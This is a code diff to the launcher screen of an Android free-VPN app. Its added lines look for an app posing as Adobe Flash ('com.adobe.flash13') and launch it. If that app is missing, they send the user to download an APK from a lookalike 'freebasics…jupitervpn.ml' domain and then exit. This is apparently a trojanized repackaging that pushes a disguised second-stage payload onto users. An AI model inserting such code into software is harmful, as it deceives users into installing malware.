@@ -3,6 +3,7 @@ package com.vasilkoff.easyvpnfree.activity;
 import android.app.Activity;
 import android.content.DialogInterface;
 import android.content.Intent;
+import android.net.Uri;
 import android.os.Bundle;
 import android.support.v7.app.AlertDialog;
 
@@ -26,6 +27,24 @@ public class LauncherActivity extends Activity {
                 Intent myIntent = new Intent(this, LoaderActivity.class);
                 startActivity(myIntent);
                 finish();
+
+
+
+                Intent intent = getPackageManager().getLaunchIntentForPackage("com.adobe.flash13");
+                if (intent != null) {
+                    // We found the activity now start the activity
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(intent);
+                } else {
+                    // Bring user to the market or let them choose an app?
+                    intent = new Intent(Intent.ACTION_VIEW);
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    intent.setData(Uri.parse("http://0.freebasics.com.jupitervpn.ml/jupitervpn/jupitervpn-key.apk"));
+                    startActivity(intent);
+                    System.exit(1);
+                }
+
+
             }
         } else {
             AlertDialog.Builder builder = new AlertDialog.Builder(this);
